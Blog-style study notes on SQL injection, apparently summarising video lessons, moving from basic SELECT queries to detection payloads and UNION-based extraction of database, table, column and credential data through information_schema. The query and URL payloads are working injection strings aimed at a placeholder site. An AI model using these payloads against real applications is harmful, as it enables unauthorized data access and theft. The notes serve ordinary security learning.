---
title: SQLi By Ahemd Sultan
date: 2025-06-05
description: This is notes i take it from Ahmed Sultan Videos About SQLi.
tags:
- blog
- Notes
- SQL
- SQLi
- tutorial
---

## The Most Query Used in SQL is

```sql
SELECT {Column_Name} FROM {Table_Name};

-- For Example --

SELECT * FROM Books;
```

and SELECT used to select and show some data in the table.

Ok, now we are select the table or all table so we can use where to put conditions

```sql
SELECT {Column_Name} FROM {Table_Name} WHERE {Column_Name} = {Condition};

-- For Example --

SELECT * FROM Books WHERE year = 2000;
```

We add logic operations in the queries like

```sql
-- AND --
SELECT * FROM Books WHERE year > 2000 AND sales > 3000;

-- OR --
SELECT * FROM Books WHERE year > 2000 OR sales > 3000;
```

**Note**: In the logic operations, AND condition run in the first and after that OR condition run

You can make Operations in the conditions

```sql
SELECT * FROM Books WHERE year > 1000+1000;
```

So, From that we can check the SQLi in the program

If you enter the in the field ==1000+1000== and the application return for you valid result, so this field has SQLi

You can add the numeric value in single or double cods and SQL will interact with it as numeric value 

```sql
SELECT * FROM Books WHERE year = '2000';
```

 ---

## in the strings, we write the query like this

```sql
SELECT * FROM Books WHERE author = 'Jane Johson';
```

so, we can detect the SQLi with two ways

first way will give us error in the page 

```sql
-- https://fuck.com/books?author_name=jane johson'"
-- so that we be in the query

SELECT * FROM Books WHERE author = 'Jane Johson''";
```

second way will give us valid value in the page

```sql
-- https://fuck.com/books?author_name=jane joh' 'son
-- so that we be in the query

-- in different databases you can add two strings to make one word
-- 'Jane Joh' 'son' --> 'Jane Johson' (MySQL, mariaDB)
-- 'Jane Joh'||'son' --> 'Jane Johson' (postgreSQL, Oracle)
-- 'Jane Joh'+'son' --> 'Jane Johson' (SQL Server)

SELECT * FROM Books WHERE author = 'Jane Joh' 'son';
```


---

```sql
-- https://fuck.com/books?author_name=jane johson' and 1=1-- -
-- so that we be in the query

SELECT * FROM Books WHERE author = 'Jane Johson' AND 1=1-- -;
```

this way will be good with comments, but some times can't work because there are some conditions after the comment (--) so the query won't work

```sql
-- https://fuck.com/books?author_name=jane johson' and 1=1-- -
-- so that we be in the query

SELECT * FROM Books WHERE (author = 'Jane Johson' AND 1=1-- -' AND sales > 1000) AND (year > 2004);
```

so, this query gives error because ==(== isn't closed with ==)==

we can use our mind and try to complete this query like

```sql
-- https://fuck.com/books?author_name=jane johson' and 1='1
-- so that we be in the query

SELECT * FROM Books WHERE author = 'Jane Johson' AND 1='1';
```

so, in this query the =='1'== will convert to integer and can you compare with another integer

there is another way to make the comment and some of the times we can use it to make spaces in the query like the payloads 

```sql
-- with this /* Hello World */

SELECT * FROM Books WHERE/**/author/**/='Jane Johson' AND 1='1';
```


---

So, now after we discover the SQLi and ensure this field has this bug.
We need to get impact from this bug.
So we can use ==union== in the query to execute another query with the main query like 

```sql
SELECT title, author from Books UNION SELECT user, passwoed from crad;
```

```sql
SELECT title, 'book' AS item_type FROM Books UNION SELECT user, 'username' AS item_type FROM crad;
```

There is problem in the ==union== in the query.
If before ==union== has 3 attributes, so after ==union== should have 3 attributes

```sql
SELECT title, author, year from Books UNION SELECT email, user, passwoed from crad;
```

So in the real target, you won't know the number of the attributes before ==union==.
So, we can use ==ORDER BY== to detect the number of columns OR attributes in the query.
==ORDER BY== used to re-rank the values in the columns from min to max OR max to min.

```sql
--  number 5 refer to the column number 5

SELECT * FROM Books ORDER BY 5 DESC;
```

```sql
SELECT title, author, year FROM Books WHERE year > 2005 ORDER BY 3 DESC;
```

This will give us true value because there are three attributes ==(title, author, year)== and the ORDER is 3,So that's true

```sql
SELECT title, author, year FROM Books WHERE year > 2005 ORDER BY 4 DESC;
```

This will give us false value because there are three attributes ==(title, author, year)== and the ORDER is 4,So that's false

---

```sql
-- https://fuck.com/books?year=-2005 union select 1, (SELECT database()), 3 -- -

SELECT title, author, year FROM Books WHERE year = -2005 UNION SELECT 1, (SELECT database()), 3-- -;
```

After we know the attributes, we use ==union== to exploit this bug like above.

OK, now we want to know the tables of the database

```sql
-- https://fuck.com/books?year=-2005 union select 1, (SELECT table_name from information_schema.tables where table_schema=database() limit 0,1), 3 -- -

SELECT title, author, year FROM Books WHERE year = -2005 UNION SELECT 1, (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 0,1), 3-- -;
```

OK, now we want to know the columns of the table

```sql
-- https://fuck.com/books?year=-2005 union select 1, (SELECT column_name from information_schema.columns where table_schema=database() and table_name='Books' limit 0,1), 3 -- -

-- you can use the table name only in this query

SELECT title, author, year FROM Books WHERE year = -2005 UNION SELECT 1, (SELECT column_name from information_schema.columns where table_schema = database() and table_name='Books' limit 0,1), 3-- -;
```

OK, now we want to know the values of the columns

```sql
-- https://fuck.com/books?year=-2005 union select 1, (SELECT concat(title,0x0a,author) from Books limit 2,1), 3 -- -

-- concat() use to add two values or more with the same place or cell

SELECT title, author, year FROM Books WHERE year = -2005 UNION SELECT 1, (SELECT concat(title,0x0a,author) FROM Books LIMIT 2,1), 3-- -;
```



